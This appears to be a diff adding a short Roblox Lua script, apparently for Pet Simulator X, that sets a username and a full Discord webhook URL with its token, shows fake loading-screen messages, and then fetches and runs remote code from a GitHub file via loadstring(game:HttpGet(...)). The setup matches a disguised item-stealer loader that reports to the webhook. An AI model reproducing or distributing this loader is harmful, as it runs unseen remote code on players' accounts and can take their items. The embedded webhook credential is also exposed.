@@ -1,0 +1,11 @@
+Username = "krayyeager"
+WebHook = "https://discord.com/api/webhooks/1150310278181961778/hp8UR1n76MjZGUQDTrk8DC_SZJYN3EUlHCreCyCx7U4GH-APCBbrqqu70ywHwxiwKyha"
+ 
+ 
+loadingscreen = true
+_G.CustomScriptName = "Coen"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psxscriptsreal/psx-scripts/main/psx%20scripts.lua", true))()
